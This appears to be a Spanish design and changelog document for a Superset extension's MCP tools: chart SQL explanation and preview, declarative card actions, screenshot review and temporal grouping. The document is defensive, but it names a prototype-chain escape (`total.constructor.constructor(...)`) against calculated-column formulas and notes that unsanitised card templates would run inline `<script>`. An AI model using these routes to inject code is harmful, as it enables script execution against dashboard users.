  `irex.validate_calculated_column_formula` tampoco lo detectaba (mismo
  filtro solo-ALL-CAPS). Corregido en ambos lados con una allowlist
  ESTRICTA (blanquear lo conocido, rechazar cualquier identificador que
  sobreviva la sustitución — no una lista de palabras peligrosas):
  `calculatedColumns.ts::findDisallowedIdentifier` (la barrera real, en el
  navegador — una fórmula así ahora compila a un evaluador nulo, igual que
  cualquier otra fórmula inválida) y
  `explore_calculated_column_core.py::extract_unknown_function_tokens`
  (ahora recibe `known_names` y ya no enmascara `scope.Nombre` sin llaves
  salvo que `Nombre` sea una columna/métrica real — mismo criterio que
  `SCOPED_BARE_REGEX` del compilador — para que el validador tampoco deje
  pasar un `total`/`col`/`row` suelto usado como punto de entrada a la
  cadena de prototipos, ej. `total.constructor.constructor(...)`).
  `valid: false` ahora incluye el identificador exacto bajo
  `unknown_functions` con el error `"identificadores/funciones no
  reconocidos: ..."`. Verificado que fórmulas legítimas reales (incluida
  la del caso `show_totals` de arriba) siguen compilando y validando
  igual que antes.
- `irex.explain_chart`, `irex.preview_chart` (implementadas, entrada 71 de
  `Registro de cambios.md`, 2026-09-24; `irex.check_chart_nulls` sigue
  pendiente): solo lectura, ligadas al gráfico, con acceso al dataset, RLS y
  límites — nunca aceptan SQL libre. Reciben el MISMO input:
  `{"form_data_key": "key-1", "query_context": "<el string de chart.query_context, sin editar>"}`
  (`preview_chart` suma `"row_limit"`, entero 1-5000, default 100). Primero
  vuelven a verificar `form_data_key` exactamente igual que
  `irex.get_explore_state` (mismos errores 403/404), y ADEMÁS que
  `query_context.datasource` coincide con el dataset/gráfico ya verificado —
  si no coincide, 422. Si pasan esa verificación, re-ejecutan el
  `query_context` tal cual con el pipeline real de Superset
  (`QueryContextFactory`/`ChartDataCommand`, RLS aplicado automáticamente) —
  ESA re-ejecución es la "verificación independiente" del `query_context`
  que pedía la sección anterior, no hace falta ningún paso adicional del
  lado del backend del chat.
  - `explain_chart` fuerza `result_type=query` (genera el SQL, nunca lo
    ejecuta contra la base — ni siquiera corre EXPLAIN, más barato todavía).
    Devuelve `{"status": "success", "sql": "...", "language": "...", "datasource": {...}, "slice_id": ...}`
    o `{"status": "error", "error": "...", "datasource": {...}}`.
  - `preview_chart` fuerza `result_type=full` (resultado real, nunca
    `samples`) con el `row_limit` pedido (nunca mayor al que ya traía el
    `query_context` capturado). Devuelve
    `{"status": "success", "sql": "...", "columns": [...], "coltypes": [...], "rows": [...], "rowcount": N, "truncated": bool, "applied_filters": [...], "rejected_filters": [...], "datasource": {...}, "slice_id": ...}`
    o el mismo `{"status": "error", ...}` de arriba.
  - Sin `chart.query_context` en el body (ver arriba), no hay nada que
    pasarles todavía — no deberían llamarse.

Si `Accept: text/event-stream`, el backend emite `session`, estados/actividad
sin argumentos ni resultados privados, y `done` con `explore_response`. Si
ocurre un error, emite `error`. El mismo endpoint devuelve JSON si no se pide
SSE. El modelo, el timeout y el esfuerzo de razonamiento son los mismos que
los del asistente de SQL Lab; no hay un nombre de modelo fijado en este
contrato.

## Interactividad declarativa en html_cards (2026-09-29)

A pedido del usuario ("busco algo más dinámico pero sin que llegue a ser
inseguro" para comportamientos JS en tarjetas), se generalizó el patrón que
ya existía solo para tablas (`data-hc-sort`/`data-hc-resize`) a un
vocabulario declarativo genérico: `data-hc-on="click"` (también dblclick/
mouseenter/mouseleave/change/submit) + `data-hc-action="nombre:arg1,arg2"`
(varias encadenadas con `;`) + `data-hc-target="selector"` opcional. El
modelo escribe NOMBRES de acción y argumentos de texto plano en
`handlebarsTemplate` — nunca código — que `dynamicActions.ts`
(`custom-plugins/plugin-chart-html-cards/src/utils/`) parsea con
`split()`/`trim()` puro y despacha a un registro fijo de funciones ya
auditadas (`toggleClass`/`addClass`/`removeClass`, `toggleAttr`, `scrollTo`,
`setStyleVar`, `copyText`, `countUp`). Una acción no reconocida se ignora
(warning en consola), nunca se interpreta como expresión ejecutable.

**Por qué esto importa más que en otros plugins**: a diferencia de
`calculated_columns` (table_v3), donde el `HTML_SANITIZATION` de Superset sí
filtra HTML antes de renderizar cualquier otro control, `html_cards`
(`handlebarsTemplate`) usa `dangerouslySetInnerHTML` con el resultado de
`sanitizeHtmlIfNeeded`, que en esta instalación tiene `HTML_SANITIZATION=False`
(confirmado en test y prod) — es decir, **NO sanitiza nada**: un
`<script>`/`onClick=` inline en `handlebarsTemplate` ya ejecutaría hoy, sin
ningún bug de compilador de por medio (a diferencia del hallazgo de
`calculated_columns`, que sí dependía de un bug real). El vocabulario
declarativo no es una barrera técnica adicional sobre eso — es la
alternativa SEGURA que el modelo debería preferir siempre en vez de HTML/JS
crudo, documentada explícitamente en el campo `note` (ver abajo) para que el
modelo no tenga necesidad de recurrir a `<script>` inline.

`irex.get_viz_controls(viz_type="html_cards")` devuelve, además de
`control_info`, un campo `note` de nivel superior (no sujeto al límite de
2000 caracteres de `control_info[control].description` — no había lugar en
`handlebarsTemplate`, que ya estaba en 1977/2000) con el vocabulario
completo de acciones, la lista de eventos permitidos, un ejemplo, y la
advertencia sobre `HTML_SANITIZATION`/`<script>` de arriba. El tooltip de
ayuda del control en la propia UI de Superset (`handlebarTemplate.tsx`)
documenta lo mismo en inglés, más corto.

## Revisión visual: `irex.get_chart_screenshot` (2026-09-29)

"Ojos" para el LLM — propuesta del usuario, coordinada con el backend del
chat antes de construir. El widget captura client-side (`dom-to-image-more`,
la MISMA librería que usa "Exportar a imagen" real de Explore) el gráfico
YA RENDERIZADO, lo sube, y RECIÉN ENTONCES manda el mensaje del usuario a
Explore — nunca al revés, el MCP no puede pedirle al navegador que capture
en el momento en que el modelo llama a la tool.

**Cómo se entera el modelo de que hay una captura disponible**: el
`user_message` del turno incluye el `capture_id` en texto plano, con este
formato exacto:
```
Revisión visual solicitada (capture_id: <id>). <detalle del usuario, si escribió algo>
```
(sin el detalle, termina en el punto después del `capture_id`). No hay
ningún campo estructurado nuevo en el contrato de la request — el modelo
lee el `capture_id` del texto del mensaje como cualquier otro dato que el
usuario escriba.

**La tool**: `irex.get_chart_screenshot({"capture_id": "<id>"})`. Devuelve
una lista de 2 bloques de contenido MCP: un bloque de texto (JSON con
`slice_id`/`form_data_key`/`detail`) y un bloque `image` real (JPEG,
`fastmcp.utilities.types.Image` → `mcp.types.ImageContent`) — o
`{"error": "not_found", "message": "..."}` (nunca crashea) si el
`capture_id` venció (10 minutos), no existe, o pertenece a otro usuario.

**Importante, confirmado con el backend (2026-09-29): el campo `images` de
un tool_result NO le llega al modelo como visión solo por existir** — hoy
`extract_text` lo convierte a texto antes de pasarlo, y el campo
`tool_result.images` que aparece en los logs de diagnóstico alimenta la
galería del widget, no la visión del LLM. El backend tiene pendiente
adaptar Explore para pasar el bloque `image` de ESTA tool específicamente
como `input_image` al mismo asistente (sin una segunda llamada a otro
agente) — sin ese cambio, el flujo sube la captura correctamente pero el
modelo todavía no la "ve".

**Endpoint de subida** (lo usa el widget directamente, el backend del chat
nunca lo llama): `POST /extensions/irex/irex-mcp-tools/chart-screenshots/upload`,
multipart (`image` JPEG + `dataset_id`/`form_data_key`/`slice_id`/`detail`),
mismo patrón de permisos y CSRF que el resto de la REST API propia de la
extensión. El `capture_id` que devuelve es el mismo que el widget embebe en
el `user_message`.

**Límite importante que la tool comunica en su propia descripción** (no un
aviso fijo de la UI, a pedido del usuario): una captura que se ve bien NO
prueba que la consulta tenga un orden determinístico — si el diseño
depende de recorrer filas en un orden específico y no hay `orderby`
explícito, la MISMA configuración puede verse distinta en la próxima
carga (hallazgo real, ver `Registro de cambios.md` — bug de matriz
marca×mes). La revisión visual complementa la verificación de la consulta,
nunca la reemplaza.

## Agrupación temporal: `query_capabilities` + `irex.resolve_temporal_expression` (2026-10-09)

Objetivo: que el modelo agrupe una columna temporal con lo que Superset y el
motor realmente soportan, sin que nadie (ni el modelo ni esta extensión)
mantenga funciones SQL de fecha por base de datos. Ejemplos reales completos:
`docs/explore-temporal-examples.json`.

### `irex.get_dataset_catalog` → nueva sección `query_capabilities`

Aditiva: `form_data_key`, `slice_id`, `datasource`, `state_kind`, `columns`,
`metrics` y `truncated` no cambian. Si la sección falla, solo ella lleva el
error; columnas y métricas se devuelven igual.

```json
"query_capabilities": {
  "status": "ok | unsupported | permission_denied | error",
  "detail": "solo si status != ok",
  "database": {"id": 2, "name": "Cubo PSQL"},
  "engine": "postgresql",
  "engine_name": "PostgreSQL",
  "backend": "postgresql",
  "sqlglot_dialect": "postgres",
  "time_grains": [{"id": "P1D", "label": "Day"}, {"id": "P1M", "label": "Month"}],
  "source": "db_engine_spec.get_time_grains"
}
```

`time_grains` es la misma lista que el selector "Time grain" de Explore
(`db_engine_spec.get_time_grains()`, con `TIME_GRAIN_ADDONS` y sin
`TIME_GRAIN_DENYLIST`). No incluye URI, usuario ni host. No expone las
plantillas SQL de cada granularidad a propósito: la expresión se pide a la tool.

### `irex.resolve_temporal_expression`

Entrada (no acepta SQL):

| campo | tipo | descripción |
|---|---|---|
| `form_data_key` | string (1–256) | revisión actual del gráfico; se verifica con `verified_explore_state` (acceso a Explore, gráfico y dataset) |
| `column_name` | string (1–256) | nombre exacto de una columna activa del dataset |
| `time_grain` | string (1–64) | un `id` de `query_capabilities.time_grains` |

Salida con `status: "generated"`:

```json
{
  "status": "generated",
  "detail": "Expresión generada por Superset para este motor; todavía no se ejecutó ni se validó.",
  "resolution": {"generated": true, "executed": false, "validated": false,
                 "method": "TableColumn.get_timestamp_expression -> db_engine_spec.get_timestamp_expr"},
  "expression": "toStartOfMonth(toDateTime(`fecha_id`))",
  "next_step": {"tool": "irex.validate_expression",
                "arguments": {"dataset_id": 5, "expression": "...", "kind": "column"}},
  "form_data_key": "...", "slice_id": 35, "state_kind": "last_persisted",
  "dataset": {"id": 5, "name": "Corte Ventas Clickhouse", "schema": "default", "database_id": 3},
  "engine": "clickhousedb",
  "column": {"name": "fecha_id", "type": "Nullable(DateTime64(6))", "is_temporal": true,
             "is_calculated": false, "expression": "(solo calculadas)", "python_date_format": "(si existe)"},
  "time_grain": {"id": "P1M", "label": "Month"}
}
```

Otros `status` (siempre con `detail` y `resolution.generated=false`, sin
`expression`): `column_not_found`, `column_not_temporal` (columna sin
`is_dttm`), `time_grain_not_supported` (trae `supported_time_grains`),
`unsupported` (el motor no declara granularidades o Superset lanza
`NotImplementedError`), `invalid_revision` (key vencida/inexistente, estado
inválido o dataset borrado), `permission_denied`, `error`.

`generated` no significa válida: el modelo debe llamar a
`irex.validate_expression` con `next_step.arguments` (eso sí ejecuta, con
`row_limit=1` y RLS) antes de proponer el cambio. La expresión se compila con
el dialecto de la base (`database.get_dialect()`, `literal_binds`) a partir de
`TableColumn.get_timestamp_expression` — para una columna calculada envuelve su
`expression` (plantillas Jinja procesadas con el template processor del
dataset); para `python_date_format` epoch aplica la conversión del motor.
